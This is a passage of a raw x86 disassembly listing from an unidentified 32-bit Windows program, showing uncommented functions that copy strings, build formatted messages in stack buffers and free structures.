  4016ae:	e8 c5 82 00 00       	call   0x409978
  4016b3:	40                   	inc    %eax
  4016b4:	83 c4 10             	add    $0x10,%esp
  4016b7:	03 c6                	add    %esi,%eax
  4016b9:	3d 00 10 00 00       	cmp    $0x1000,%eax
  4016be:	76 07                	jbe    0x4016c7
  4016c0:	5e                   	pop    %esi
  4016c1:	5d                   	pop    %ebp
  4016c2:	83 c8 ff             	or     $0xffffffff,%eax
  4016c5:	5b                   	pop    %ebx
  4016c6:	c3                   	ret
  4016c7:	57                   	push   %edi
  4016c8:	8b 7c 24 14          	mov    0x14(%esp),%edi
  4016cc:	8b cb                	mov    %ebx,%ecx
  4016ce:	8d 57 68             	lea    0x68(%edi),%edx
  4016d1:	2b d3                	sub    %ebx,%edx
  4016d3:	8a 01                	mov    (%ecx),%al
  4016d5:	8d 49 01             	lea    0x1(%ecx),%ecx
  4016d8:	88 44 0a ff          	mov    %al,-0x1(%edx,%ecx,1)
  4016dc:	84 c0                	test   %al,%al
  4016de:	75 f3                	jne    0x4016d3
  4016e0:	8b f5                	mov    %ebp,%esi
  4016e2:	8a 45 00             	mov    0x0(%ebp),%al
  4016e5:	45                   	inc    %ebp
  4016e6:	84 c0                	test   %al,%al
  4016e8:	75 f8                	jne    0x4016e2
  4016ea:	2b ee                	sub    %esi,%ebp
  4016ec:	83 ef 99             	sub    $0xffffff99,%edi
  4016ef:	90                   	nop
  4016f0:	8a 47 01             	mov    0x1(%edi),%al
  4016f3:	47                   	inc    %edi
  4016f4:	84 c0                	test   %al,%al
  4016f6:	75 f8                	jne    0x4016f0
  4016f8:	8b cd                	mov    %ebp,%ecx
  4016fa:	c1 e9 02             	shr    $0x2,%ecx
  4016fd:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4016ff:	8b cd                	mov    %ebp,%ecx
  401701:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  401705:	83 e1 03             	and    $0x3,%ecx
  401708:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40170a:	8d 85 68 10 00 00    	lea    0x1068(%ebp),%eax
  401710:	8b d0                	mov    %eax,%edx
  401712:	2b d3                	sub    %ebx,%edx
  401714:	5f                   	pop    %edi
  401715:	8a 0b                	mov    (%ebx),%cl
  401717:	8d 5b 01             	lea    0x1(%ebx),%ebx
  40171a:	88 4c 1a ff          	mov    %cl,-0x1(%edx,%ebx,1)
  40171e:	84 c9                	test   %cl,%cl
  401720:	75 f3                	jne    0x401715
  401722:	8d 95 68 30 00 00    	lea    0x3068(%ebp),%edx
  401728:	c7 85 68 40 00 00 00 	movl   $0x0,0x4068(%ebp)
  40172f:	00 00 00 
  401732:	2b d0                	sub    %eax,%edx
  401734:	8a 08                	mov    (%eax),%cl
  401736:	8d 40 01             	lea    0x1(%eax),%eax
  401739:	88 4c 02 ff          	mov    %cl,-0x1(%edx,%eax,1)
  40173d:	84 c9                	test   %cl,%cl
  40173f:	75 f3                	jne    0x401734
  401741:	5e                   	pop    %esi
  401742:	5d                   	pop    %ebp
  401743:	33 c0                	xor    %eax,%eax
  401745:	5b                   	pop    %ebx
  401746:	c3                   	ret
  401747:	cc                   	int3
  401748:	cc                   	int3
  401749:	cc                   	int3
  40174a:	cc                   	int3
  40174b:	cc                   	int3
  40174c:	cc                   	int3
  40174d:	cc                   	int3
  40174e:	cc                   	int3
  40174f:	cc                   	int3
  401750:	56                   	push   %esi
  401751:	ff 74 24 10          	push   0x10(%esp)
  401755:	8b 74 24 0c          	mov    0xc(%esp),%esi
  401759:	ff 74 24 10          	push   0x10(%esp)
  40175d:	56                   	push   %esi
  40175e:	e8 2d ff ff ff       	call   0x401690
  401763:	83 c4 0c             	add    $0xc,%esp
  401766:	85 c0                	test   %eax,%eax
  401768:	75 22                	jne    0x40178c
  40176a:	56                   	push   %esi
  40176b:	e8 f0 fd ff ff       	call   0x401560
  401770:	83 c4 04             	add    $0x4,%esp
  401773:	85 c0                	test   %eax,%eax
  401775:	74 1a                	je     0x401791
  401777:	8b 06                	mov    (%esi),%eax
  401779:	85 c0                	test   %eax,%eax
  40177b:	74 0f                	je     0x40178c
  40177d:	50                   	push   %eax
  40177e:	e8 59 85 00 00       	call   0x409cdc
  401783:	83 c4 04             	add    $0x4,%esp
  401786:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  40178c:	83 c8 ff             	or     $0xffffffff,%eax
  40178f:	5e                   	pop    %esi
  401790:	c3                   	ret
  401791:	33 c0                	xor    %eax,%eax
  401793:	5e                   	pop    %esi
  401794:	c3                   	ret
  401795:	cc                   	int3
  401796:	cc                   	int3
  401797:	cc                   	int3
  401798:	cc                   	int3
  401799:	cc                   	int3
  40179a:	cc                   	int3
  40179b:	cc                   	int3
  40179c:	cc                   	int3
  40179d:	cc                   	int3
  40179e:	cc                   	int3
  40179f:	cc                   	int3
  4017a0:	56                   	push   %esi
  4017a1:	8b 74 24 08          	mov    0x8(%esp),%esi
  4017a5:	85 f6                	test   %esi,%esi
  4017a7:	74 2e                	je     0x4017d7
  4017a9:	8b 46 08             	mov    0x8(%esi),%eax
  4017ac:	85 c0                	test   %eax,%eax
  4017ae:	74 09                	je     0x4017b9
  4017b0:	50                   	push   %eax
  4017b1:	e8 a0 84 00 00       	call   0x409c56
  4017b6:	83 c4 04             	add    $0x4,%esp
  4017b9:	8b 06                	mov    (%esi),%eax
  4017bb:	85 c0                	test   %eax,%eax
  4017bd:	74 0f                	je     0x4017ce
  4017bf:	50                   	push   %eax
  4017c0:	e8 17 85 00 00       	call   0x409cdc
  4017c5:	83 c4 04             	add    $0x4,%esp
  4017c8:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  4017ce:	56                   	push   %esi
  4017cf:	e8 82 84 00 00       	call   0x409c56
  4017d4:	83 c4 04             	add    $0x4,%esp
  4017d7:	5e                   	pop    %esi
  4017d8:	c3                   	ret
  4017d9:	cc                   	int3
  4017da:	cc                   	int3
  4017db:	cc                   	int3
  4017dc:	cc                   	int3
  4017dd:	cc                   	int3
  4017de:	cc                   	int3
  4017df:	cc                   	int3
  4017e0:	b8 68 a6 43 00       	mov    $0x43a668,%eax
  4017e5:	c3                   	ret
  4017e6:	cc                   	int3
  4017e7:	cc                   	int3
  4017e8:	cc                   	int3
  4017e9:	cc                   	int3
  4017ea:	cc                   	int3
  4017eb:	cc                   	int3
  4017ec:	cc                   	int3
  4017ed:	cc                   	int3
  4017ee:	cc                   	int3
  4017ef:	cc                   	int3
  4017f0:	81 ec 08 04 00 00    	sub    $0x408,%esp
  4017f6:	a1 08 c0 42 00       	mov    0x42c008,%eax
  4017fb:	33 c4                	xor    %esp,%eax
  4017fd:	89 84 24 04 04 00 00 	mov    %eax,0x404(%esp)
  401804:	56                   	push   %esi
  401805:	8b b4 24 10 04 00 00 	mov    0x410(%esp),%esi
  40180c:	8d 84 24 18 04 00 00 	lea    0x418(%esp),%eax
  401813:	57                   	push   %edi
  401814:	50                   	push   %eax
  401815:	6a 00                	push   $0x0
  401817:	ff b4 24 20 04 00 00 	push   0x420(%esp)
  40181e:	8d 44 24 14          	lea    0x14(%esp),%eax
  401822:	68 00 04 00 00       	push   $0x400
  401827:	50                   	push   %eax
  401828:	e8 b3 ff ff ff       	call   0x4017e0
  40182d:	8b 08                	mov    (%eax),%ecx
  40182f:	ff 70 04             	push   0x4(%eax)
  401832:	83 c9 01             	or     $0x1,%ecx
  401835:	51                   	push   %ecx
  401836:	e8 25 b5 00 00       	call   0x40cd60
  40183b:	8b f8                	mov    %eax,%edi
  40183d:	83 c4 1c             	add    $0x1c,%esp
  401840:	83 c8 ff             	or     $0xffffffff,%eax
  401843:	85 ff                	test   %edi,%edi
  401845:	0f 48 f8             	cmovs  %eax,%edi
  401848:	81 ff 00 04 00 00    	cmp    $0x400,%edi
  40184e:	7d 77                	jge    0x4018c7
  401850:	53                   	push   %ebx
  401851:	bb ff 03 00 00       	mov    $0x3ff,%ebx
  401856:	8b c3                	mov    %ebx,%eax
  401858:	2b c7                	sub    %edi,%eax
  40185a:	50                   	push   %eax
  40185b:	8d 44 24 10          	lea    0x10(%esp),%eax
  40185f:	03 c7                	add    %edi,%eax
  401861:	56                   	push   %esi
  401862:	50                   	push   %eax
  401863:	e8 58 b6 00 00       	call   0x40cec0
  401868:	83 c4 0c             	add    $0xc,%esp
  40186b:	8d 4e 01             	lea    0x1(%esi),%ecx
  40186e:	66 90                	xchg   %ax,%ax
  401870:	8a 06                	mov    (%esi),%al
  401872:	46                   	inc    %esi
  401873:	84 c0                	test   %al,%al
  401875:	75 f9                	jne    0x401870
  401877:	2b f1                	sub    %ecx,%esi
  401879:	03 fe                	add    %esi,%edi
  40187b:	81 ff 00 04 00 00    	cmp    $0x400,%edi
  401881:	7d 43                	jge    0x4018c6
  401883:	6a 02                	push   $0x2
  401885:	8d 44 24 10          	lea    0x10(%esp),%eax
  401889:	03 c7                	add    %edi,%eax
  40188b:	68 d4 03 42 00       	push   $0x4203d4
  401890:	50                   	push   %eax
  401891:	e8 2a b6 00 00       	call   0x40cec0
  401896:	83 c7 02             	add    $0x2,%edi
  401899:	83 c4 0c             	add    $0xc,%esp
  40189c:	81 ff 00 04 00 00    	cmp    $0x400,%edi
  4018a2:	7d 22                	jge    0x4018c6
  4018a4:	e8 78 b5 00 00       	call   0x40ce21
  4018a9:	2b df                	sub    %edi,%ebx
  4018ab:	53                   	push   %ebx
  4018ac:	ff 30                	push   (%eax)
  4018ae:	e8 fd b5 00 00       	call   0x40ceb0
  4018b3:	83 c4 04             	add    $0x4,%esp
  4018b6:	50                   	push   %eax
  4018b7:	8d 44 24 14          	lea    0x14(%esp),%eax
  4018bb:	03 c7                	add    %edi,%eax
  4018bd:	50                   	push   %eax
  4018be:	e8 fd b5 00 00       	call   0x40cec0
  4018c3:	83 c4 0c             	add    $0xc,%esp
  4018c6:	5b                   	pop    %ebx
  4018c7:	6a 30                	push   $0x30
  4018c9:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4018cd:	c6 84 24 0b 04 00 00 	movb   $0x0,0x40b(%esp)
  4018d4:	00 
  4018d5:	68 ac 03 42 00       	push   $0x4203ac
  4018da:	50                   	push   %eax
  4018db:	e8 10 02 00 00       	call   0x401af0
  4018e0:	8b 8c 24 18 04 00 00 	mov    0x418(%esp),%ecx
  4018e7:	83 c4 0c             	add    $0xc,%esp
  4018ea:	5f                   	pop    %edi
  4018eb:	5e                   	pop    %esi
  4018ec:	33 cc                	xor    %esp,%ecx
  4018ee:	e8 71 61 00 00       	call   0x407a64
  4018f3:	81 c4 08 04 00 00    	add    $0x408,%esp
  4018f9:	c3                   	ret
  4018fa:	cc                   	int3
  4018fb:	cc                   	int3
  4018fc:	cc                   	int3
  4018fd:	cc                   	int3
  4018fe:	cc                   	int3
  4018ff:	cc                   	int3
  401900:	81 ec 08 04 00 00    	sub    $0x408,%esp
  401906:	a1 08 c0 42 00       	mov    0x42c008,%eax
  40190b:	33 c4                	xor    %esp,%eax
  40190d:	89 84 24 04 04 00 00 	mov    %eax,0x404(%esp)
  401914:	55                   	push   %ebp
  401915:	56                   	push   %esi
  401916:	8b b4 24 14 04 00 00 	mov    0x414(%esp),%esi
  40191d:	57                   	push   %edi
  40191e:	ff 15 08 00 42 00    	call   *0x420008
  401924:	8b e8                	mov    %eax,%ebp
  401926:	8d 84 24 20 04 00 00 	lea    0x420(%esp),%eax
  40192d:	50                   	push   %eax
  40192e:	6a 00                	push   $0x0
  401930:	ff b4 24 24 04 00 00 	push   0x424(%esp)
  401937:	8d 44 24 18          	lea    0x18(%esp),%eax
  40193b:	68 00 04 00 00       	push   $0x400
  401940:	50                   	push   %eax
  401941:	e8 9a fe ff ff       	call   0x4017e0
  401946:	8b 08                	mov    (%eax),%ecx
  401948:	ff 70 04             	push   0x4(%eax)
  40194b:	83 c9 01             	or     $0x1,%ecx
  40194e:	51                   	push   %ecx
  40194f:	e8 0c b4 00 00       	call   0x40cd60
  401954:	8b f8                	mov    %eax,%edi
  401956:	83 c4 1c             	add    $0x1c,%esp
  401959:	83 c8 ff             	or     $0xffffffff,%eax
  40195c:	85 ff                	test   %edi,%edi
  40195e:	0f 48 f8             	cmovs  %eax,%edi
  401961:	81 ff 00 04 00 00    	cmp    $0x400,%edi
  401967:	7d 6f                	jge    0x4019d8
  401969:	53                   	push   %ebx
  40196a:	bb ff 03 00 00       	mov    $0x3ff,%ebx
  40196f:	8b c3                	mov    %ebx,%eax
  401971:	2b c7                	sub    %edi,%eax
  401973:	50                   	push   %eax
  401974:	8d 44 24 14          	lea    0x14(%esp),%eax
  401978:	03 c7                	add    %edi,%eax
  40197a:	56                   	push   %esi
  40197b:	50                   	push   %eax
  40197c:	e8 3f b5 00 00       	call   0x40cec0
  401981:	83 c4 0c             	add    $0xc,%esp
  401984:	8d 4e 01             	lea    0x1(%esi),%ecx
  401987:	8a 06                	mov    (%esi),%al
  401989:	46                   	inc    %esi
  40198a:	84 c0                	test   %al,%al
  40198c:	75 f9                	jne    0x401987
  40198e:	2b f1                	sub    %ecx,%esi
  401990:	03 fe                	add    %esi,%edi
  401992:	81 ff 00 04 00 00    	cmp    $0x400,%edi
  401998:	7d 3d                	jge    0x4019d7
  40199a:	6a 02                	push   $0x2
  40199c:	8d 44 24 14          	lea    0x14(%esp),%eax
  4019a0:	03 c7                	add    %edi,%eax
  4019a2:	68 d4 03 42 00       	push   $0x4203d4
  4019a7:	50                   	push   %eax
  4019a8:	e8 13 b5 00 00       	call   0x40cec0
  4019ad:	83 c7 02             	add    $0x2,%edi
  4019b0:	83 c4 0c             	add    $0xc,%esp
  4019b3:	81 ff 00 04 00 00    	cmp    $0x400,%edi
  4019b9:	7d 1c                	jge    0x4019d7
  4019bb:	2b df                	sub    %edi,%ebx
  4019bd:	53                   	push   %ebx
  4019be:	55                   	push   %ebp
  4019bf:	e8 dc 2e 00 00       	call   0x4048a0
  4019c4:	83 c4 04             	add    $0x4,%esp
  4019c7:	50                   	push   %eax
  4019c8:	8d 44 24 18          	lea    0x18(%esp),%eax
  4019cc:	03 c7                	add    %edi,%eax
  4019ce:	50                   	push   %eax
  4019cf:	e8 ec b4 00 00       	call   0x40cec0
  4019d4:	83 c4 0c             	add    $0xc,%esp
  4019d7:	5b                   	pop    %ebx
  4019d8:	6a 30                	push   $0x30
  4019da:	8d 44 24 10          	lea    0x10(%esp),%eax
  4019de:	c6 84 24 0f 04 00 00 	movb   $0x0,0x40f(%esp)
  4019e5:	00 
  4019e6:	68 ac 03 42 00       	push   $0x4203ac
  4019eb:	50                   	push   %eax
  4019ec:	e8 ff 00 00 00       	call   0x401af0
  4019f1:	8b 8c 24 1c 04 00 00 	mov    0x41c(%esp),%ecx
  4019f8:	83 c4 0c             	add    $0xc,%esp
  4019fb:	5f                   	pop    %edi
  4019fc:	5e                   	pop    %esi
  4019fd:	5d                   	pop    %ebp
  4019fe:	33 cc                	xor    %esp,%ecx
  401a00:	e8 5f 60 00 00       	call   0x407a64
  401a05:	81 c4 08 04 00 00    	add    $0x408,%esp
  401a0b:	c3                   	ret
  401a0c:	cc                   	int3
  401a0d:	cc                   	int3
  401a0e:	cc                   	int3
  401a0f:	cc                   	int3
  401a10:	81 ec 04 04 00 00    	sub    $0x404,%esp
  401a16:	a1 08 c0 42 00       	mov    0x42c008,%eax
  401a1b:	33 c4                	xor    %esp,%eax
  401a1d:	89 84 24 00 04 00 00 	mov    %eax,0x400(%esp)
  401a24:	8d 84 24 0c 04 00 00 	lea    0x40c(%esp),%eax
  401a2b:	50                   	push   %eax
  401a2c:	6a 00                	push   $0x0
  401a2e:	ff b4 24 10 04 00 00 	push   0x410(%esp)
  401a35:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401a39:	68 00 04 00 00       	push   $0x400
  401a3e:	50                   	push   %eax
  401a3f:	e8 9c fd ff ff       	call   0x4017e0
  401a44:	8b 08                	mov    (%eax),%ecx
  401a46:	ff 70 04             	push   0x4(%eax)
  401a49:	83 c9 01             	or     $0x1,%ecx
  401a4c:	51                   	push   %ecx
  401a4d:	e8 0e b3 00 00       	call   0x40cd60
  401a52:	6a 30                	push   $0x30
  401a54:	8d 44 24 20          	lea    0x20(%esp),%eax
  401a58:	68 ac 03 42 00       	push   $0x4203ac
  401a5d:	50                   	push   %eax
  401a5e:	e8 8d 00 00 00       	call   0x401af0
  401a63:	8b 8c 24 28 04 00 00 	mov    0x428(%esp),%ecx
  401a6a:	83 c4 28             	add    $0x28,%esp
  401a6d:	33 cc                	xor    %esp,%ecx
  401a6f:	e8 f0 5f 00 00       	call   0x407a64
  401a74:	81 c4 04 04 00 00    	add    $0x404,%esp
  401a7a:	c3                   	ret
  401a7b:	cc                   	int3
  401a7c:	cc                   	int3
  401a7d:	cc                   	int3
  401a7e:	cc                   	int3
  401a7f:	cc                   	int3
  401a80:	81 ec 04 04 00 00    	sub    $0x404,%esp
  401a86:	a1 08 c0 42 00       	mov    0x42c008,%eax
  401a8b:	33 c4                	xor    %esp,%eax
  401a8d:	89 84 24 00 04 00 00 	mov    %eax,0x400(%esp)
  401a94:	8d 84 24 0c 04 00 00 	lea    0x40c(%esp),%eax
  401a9b:	50                   	push   %eax
  401a9c:	6a 00                	push   $0x0
  401a9e:	ff b4 24 10 04 00 00 	push   0x410(%esp)
  401aa5:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401aa9:	68 00 04 00 00       	push   $0x400
  401aae:	50                   	push   %eax
  401aaf:	e8 2c fd ff ff       	call   0x4017e0
  401ab4:	8b 08                	mov    (%eax),%ecx
  401ab6:	ff 70 04             	push   0x4(%eax)
  401ab9:	83 c9 01             	or     $0x1,%ecx
  401abc:	51                   	push   %ecx
  401abd:	e8 9e b2 00 00       	call   0x40cd60
  401ac2:	6a 30                	push   $0x30
  401ac4:	8d 44 24 20          	lea    0x20(%esp),%eax
  401ac8:	68 c4 03 42 00       	push   $0x4203c4
  401acd:	50                   	push   %eax
  401ace:	e8 1d 00 00 00       	call   0x401af0
  401ad3:	8b 8c 24 28 04 00 00 	mov    0x428(%esp),%ecx
  401ada:	83 c4 28             	add    $0x28,%esp
  401add:	33 cc                	xor    %esp,%ecx
  401adf:	e8 80 5f 00 00       	call   0x407a64
  401ae4:	81 c4 04 04 00 00    	add    $0x404,%esp
  401aea:	c3                   	ret
  401aeb:	cc                   	int3
  401aec:	cc                   	int3
  401aed:	cc                   	int3
  401aee:	cc                   	int3
  401aef:	cc                   	int3
  401af0:	b8 04 10 00 00       	mov    $0x1004,%eax
  401af5:	e8 86 5f 00 00       	call   0x407a80
  401afa:	a1 08 c0 42 00       	mov    0x42c008,%eax
  401aff:	33 c4                	xor    %esp,%eax
  401b01:	89 84 24 00 10 00 00 	mov    %eax,0x1000(%esp)
  401b08:	56                   	push   %esi
  401b09:	8b b4 24 0c 10 00 00 	mov    0x100c(%esp),%esi
  401b10:	8d 44 24 04          	lea    0x4(%esp),%eax
  401b14:	57                   	push   %edi
  401b15:	8b bc 24 14 10 00 00 	mov    0x1014(%esp),%edi
  401b1c:	68 00 08 00 00       	push   $0x800
  401b21:	6a 00                	push   $0x0
  401b23:	50                   	push   %eax
  401b24:	e8 57 6c 00 00       	call   0x408780
  401b29:	68 00 04 00 00       	push   $0x400
  401b2e:	8d 84 24 18 08 00 00 	lea    0x818(%esp),%eax
  401b35:	56                   	push   %esi
  401b36:	50                   	push   %eax
  401b37:	e8 f4 31 00 00       	call   0x404d30
  401b3c:	83 c4 18             	add    $0x18,%esp
  401b3f:	85 c0                	test   %eax,%eax
  401b41:	74 46                	je     0x401b89
  401b43:	68 00 04 00 00       	push   $0x400
  401b48:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401b4c:	57                   	push   %edi
  401b4d:	50                   	push   %eax
  401b4e:	e8 dd 31 00 00       	call   0x404d30
  401b53:	83 c4 0c             	add    $0xc,%esp
  401b56:	8d 44 24 08          	lea    0x8(%esp),%eax
  401b5a:	ff b4 24 18 10 00 00 	push   0x1018(%esp)
  401b61:	50                   	push   %eax
  401b62:	8d 84 24 10 08 00 00 	lea    0x810(%esp),%eax
  401b69:	50                   	push   %eax
  401b6a:	6a 00                	push   $0x0
  401b6c:	ff 15 80 01 42 00    	call   *0x420180
  401b72:	5f                   	pop    %edi
  401b73:	5e                   	pop    %esi
  401b74:	8b 8c 24 00 10 00 00 	mov    0x1000(%esp),%ecx
  401b7b:	33 cc                	xor    %esp,%ecx
  401b7d:	e8 e2 5e 00 00       	call   0x407a64
  401b82:	81 c4 04 10 00 00    	add    $0x1004,%esp
  401b88:	c3                   	ret
  401b89:	ff b4 24 18 10 00 00 	push   0x1018(%esp)
  401b90:	57                   	push   %edi
  401b91:	56                   	push   %esi
  401b92:	6a 00                	push   $0x0
  401b94:	ff 15 84 01 42 00    	call   *0x420184
  401b9a:	8b 8c 24 08 10 00 00 	mov    0x1008(%esp),%ecx
  401ba1:	5f                   	pop    %edi
  401ba2:	5e                   	pop    %esi
  401ba3:	33 cc                	xor    %esp,%ecx
  401ba5:	e8 ba 5e 00 00       	call   0x407a64
  401baa:	81 c4 04 10 00 00    	add    $0x1004,%esp
  401bb0:	c3                   	ret
  401bb1:	cc                   	int3
  401bb2:	cc                   	int3
  401bb3:	cc                   	int3
  401bb4:	cc                   	int3
  401bb5:	cc                   	int3
  401bb6:	cc                   	int3
  401bb7:	cc                   	int3
  401bb8:	cc                   	int3
  401bb9:	cc                   	int3
  401bba:	cc                   	int3
  401bbb:	cc                   	int3
  401bbc:	cc                   	int3
  401bbd:	cc                   	int3
  401bbe:	cc                   	int3
  401bbf:	cc                   	int3
  401bc0:	b8 04 50 00 00       	mov    $0x5004,%eax
  401bc5:	e8 b6 5e 00 00       	call   0x407a80
  401bca:	a1 08 c0 42 00       	mov    0x42c008,%eax
  401bcf:	33 c4                	xor    %esp,%eax
  401bd1:	89 84 24 00 50 00 00 	mov    %eax,0x5000(%esp)
  401bd8:	8b 84 24 0c 50 00 00 	mov    0x500c(%esp),%eax
  401bdf:	53                   	push   %ebx
  401be0:	8b 9c 24 0c 50 00 00 	mov    0x500c(%esp),%ebx
  401be7:	56                   	push   %esi
  401be8:	50                   	push   %eax
  401be9:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401bed:	8b 33                	mov    (%ebx),%esi
  401bef:	50                   	push   %eax
  401bf0:	8d 84 24 10 20 00 00 	lea    0x2010(%esp),%eax
  401bf7:	50                   	push   %eax
  401bf8:	e8 53 08 00 00       	call   0x402450
  401bfd:	83 c4 0c             	add    $0xc,%esp
  401c00:	83 f8 ff             	cmp    $0xffffffff,%eax
  401c03:	75 19                	jne    0x401c1e
  401c05:	5e                   	pop    %esi
  401c06:	0b c0                	or     %eax,%eax
  401c08:	5b                   	pop    %ebx
  401c09:	8b 8c 24 00 50 00 00 	mov    0x5000(%esp),%ecx
  401c10:	33 cc                	xor    %esp,%ecx
  401c12:	e8 4d 5e 00 00       	call   0x407a64
  401c17:	81 c4 04 50 00 00    	add    $0x5004,%esp
  401c1d:	c3                   	ret
  401c1e:	57                   	push   %edi
  401c1f:	8d 84 24 0c 20 00 00 	lea    0x200c(%esp),%eax
  401c26:	50                   	push   %eax
  401c27:	8d 84 24 10 40 00 00 	lea    0x4010(%esp),%eax
  401c2e:	50                   	push   %eax
  401c2f:	e8 bc 0d 00 00       	call   0x4029f0
  401c34:	8d 44 24 14          	lea    0x14(%esp),%eax
  401c38:	50                   	push   %eax
  401c39:	68 3c 04 42 00       	push   $0x42043c
  401c3e:	8d 84 24 1c 40 00 00 	lea    0x401c(%esp),%eax
  401c45:	50                   	push   %eax
  401c46:	68 3c 04 42 00       	push   $0x42043c
  401c4b:	8d be 68 10 00 00    	lea    0x1068(%esi),%edi
  401c51:	57                   	push   %edi
  401c52:	8d 84 24 28 30 00 00 	lea    0x3028(%esp),%eax
  401c59:	68 40 04 42 00       	push   $0x420440
  401c5e:	50                   	push   %eax
  401c5f:	e8 3c 03 00 00       	call   0x401fa0
  401c64:	83 c4 24             	add    $0x24,%esp
  401c67:	85 c0                	test   %eax,%eax
  401c69:	75 29                	jne    0x401c94
  401c6b:	56                   	push   %esi
  401c6c:	e8 df 1f 00 00       	call   0x403c50
  401c71:	83 c4 04             	add    $0x4,%esp
  401c74:	83 f8 ff             	cmp    $0xffffffff,%eax
  401c77:	74 75                	je     0x401cee
  401c79:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401c7d:	50                   	push   %eax
  401c7e:	8d 86 68 20 00 00    	lea    0x2068(%esi),%eax
  401c84:	50                   	push   %eax
  401c85:	8d 84 24 14 30 00 00 	lea    0x3014(%esp),%eax
  401c8c:	50                   	push   %eax
  401c8d:	e8 8e 1e 00 00       	call   0x403b20
  401c92:	eb 4e                	jmp    0x401ce2
  401c94:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401c98:	50                   	push   %eax
  401c99:	68 3c 04 42 00       	push   $0x42043c
  401c9e:	8d 84 24 14 40 00 00 	lea    0x4014(%esp),%eax
  401ca5:	50                   	push   %eax
  401ca6:	68 3c 04 42 00       	push   $0x42043c
  401cab:	68 60 04 42 00       	push   $0x420460
  401cb0:	68 3c 04 42 00       	push   $0x42043c
  401cb5:	57                   	push   %edi
  401cb6:	8d 84 24 28 30 00 00 	lea    0x3028(%esp),%eax
  401cbd:	68 64 04 42 00       	push   $0x420464
  401cc2:	50                   	push   %eax
  401cc3:	e8 d8 02 00 00       	call   0x401fa0
  401cc8:	83 c4 24             	add    $0x24,%esp
  401ccb:	85 c0                	test   %eax,%eax
  401ccd:	75 4c                	jne    0x401d1b
  401ccf:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401cd3:	50                   	push   %eax
  401cd4:	8d 84 24 10 30 00 00 	lea    0x3010(%esp),%eax
  401cdb:	50                   	push   %eax
  401cdc:	56                   	push   %esi
  401cdd:	e8 1e 03 00 00       	call   0x402000
  401ce2:	83 c4 0c             	add    $0xc,%esp
  401ce5:	83 f8 ff             	cmp    $0xffffffff,%eax
  401ce8:	0f 85 2f 01 00 00    	jne    0x401e1d
  401cee:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401cf2:	50                   	push   %eax
  401cf3:	68 4c 04 42 00       	push   $0x42044c
  401cf8:	e8 13 fd ff ff       	call   0x401a10
  401cfd:	83 c4 08             	add    $0x8,%esp
  401d00:	83 c8 ff             	or     $0xffffffff,%eax
  401d03:	5f                   	pop    %edi
  401d04:	5e                   	pop    %esi
  401d05:	5b                   	pop    %ebx
  401d06:	8b 8c 24 00 50 00 00 	mov    0x5000(%esp),%ecx
  401d0d:	33 cc                	xor    %esp,%ecx
  401d0f:	e8 50 5d 00 00       	call   0x407a64
  401d14:	81 c4 04 50 00 00    	add    $0x5004,%esp
  401d1a:	c3                   	ret
  401d1b:	8d 84 24 0c 20 00 00 	lea    0x200c(%esp),%eax
  401d22:	50                   	push   %eax
  401d23:	68 3c 04 42 00       	push   $0x42043c
  401d28:	57                   	push   %edi
  401d29:	8d 84 24 18 10 00 00 	lea    0x1018(%esp),%eax
  401d30:	68 74 04 42 00       	push   $0x420474
  401d35:	50                   	push   %eax
  401d36:	e8 65 02 00 00       	call   0x401fa0
  401d3b:	83 c4 14             	add    $0x14,%esp
  401d3e:	85 c0                	test   %eax,%eax
  401d40:	74 4e                	je     0x401d90
  401d42:	8d 84 24 0c 20 00 00 	lea    0x200c(%esp),%eax
  401d49:	50                   	push   %eax
  401d4a:	68 3c 04 42 00       	push   $0x42043c
  401d4f:	57                   	push   %edi
  401d50:	8d 84 24 18 10 00 00 	lea    0x1018(%esp),%eax
  401d57:	68 80 04 42 00       	push   $0x420480
  401d5c:	50                   	push   %eax
  401d5d:	e8 3e 02 00 00       	call   0x401fa0
  401d62:	83 c4 14             	add    $0x14,%esp
  401d65:	85 c0                	test   %eax,%eax
  401d67:	74 27                	je     0x401d90
  401d69:	8d 84 24 0c 20 00 00 	lea    0x200c(%esp),%eax
  401d70:	50                   	push   %eax
  401d71:	68 3c 04 42 00       	push   $0x42043c
  401d76:	57                   	push   %edi
  401d77:	8d 84 24 18 10 00 00 	lea    0x1018(%esp),%eax
  401d7e:	68 8c 04 42 00       	push   $0x42048c
  401d83:	50                   	push   %eax
  401d84:	e8 17 02 00 00       	call   0x401fa0
  401d89:	83 c4 14             	add    $0x14,%esp
  401d8c:	85 c0                	test   %eax,%eax
  401d8e:	75 17                	jne    0x401da7
  401d90:	8d 84 24 0c 10 00 00 	lea    0x100c(%esp),%eax
  401d97:	50                   	push   %eax
  401d98:	53                   	push   %ebx
  401d99:	e8 a2 00 00 00       	call   0x401e40
  401d9e:	8b f0                	mov    %eax,%esi
  401da0:	83 c4 08             	add    $0x8,%esp
  401da3:	85 f6                	test   %esi,%esi
  401da5:	75 30                	jne    0x401dd7
  401da7:	8d 84 24 0c 10 00 00 	lea    0x100c(%esp),%eax
  401dae:	50                   	push   %eax
  401daf:	68 94 04 42 00       	push   $0x420494
  401db4:	e8 57 fc ff ff       	call   0x401a10
  401db9:	83 c4 08             	add    $0x8,%esp
  401dbc:	83 c8 ff             	or     $0xffffffff,%eax
  401dbf:	5f                   	pop    %edi
  401dc0:	5e                   	pop    %esi
  401dc1:	5b                   	pop    %ebx
  401dc2:	8b 8c 24 00 50 00 00 	mov    0x5000(%esp),%ecx
  401dc9:	33 cc                	xor    %esp,%ecx
  401dcb:	e8 94 5c 00 00       	call   0x407a64
  401dd0:	81 c4 04 50 00 00    	add    $0x5004,%esp
  401dd6:	c3                   	ret
  401dd7:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401ddb:	50                   	push   %eax
  401ddc:	56                   	push   %esi
  401ddd:	e8 5e 02 00 00       	call   0x402040
  401de2:	83 c4 08             	add    $0x8,%esp
